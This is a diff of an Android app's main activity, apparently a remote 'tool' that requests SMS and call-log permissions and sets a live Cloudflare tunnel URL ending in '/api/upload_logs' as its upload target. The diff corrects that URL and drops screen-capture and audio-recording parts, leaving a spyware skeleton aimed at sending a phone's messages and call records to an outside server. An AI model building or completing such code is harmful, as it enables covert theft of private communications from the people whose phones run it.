@@ -1,14 +1,11 @@
 package com.example.remotetool;
 
 import android.Manifest;
-import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Bundle;
 import android.provider.CallLog;
-import android.util.Base64;
 import android.util.Log;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -29,21 +26,19 @@ import okhttp3.Response;
 public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 123;
-    private static final int SCREEN_CAPTURE_REQUEST_CODE = 100;
     
-    // Apna server URL yahan daalna (jaise ngrok ya cloudflare URL)
-    private static final String SERVER_URL = "[https://quantities-cambridge-superb-somerset.trycloudflare.com](https://quantities-cambridge-superb-somerset.trycloudflare.com)/api/upload_logs";
+    // Yahan tera Cloudflare live server URL set kar diya hai
+    private static final String SERVER_URL = "https://quantities-cambridge-superb-somerset.trycloudflare.com/api/upload_logs";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        // Permissions Check: SMS, Call Logs, Audio
+        // Permissions Check: SMS aur Call Logs
         String[] permissions = {
             Manifest.permission.READ_SMS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.RECORD_AUDIO
+            Manifest.permission.READ_CALL_LOG
         };
 
         if (!hasPermissions(permissions)) {
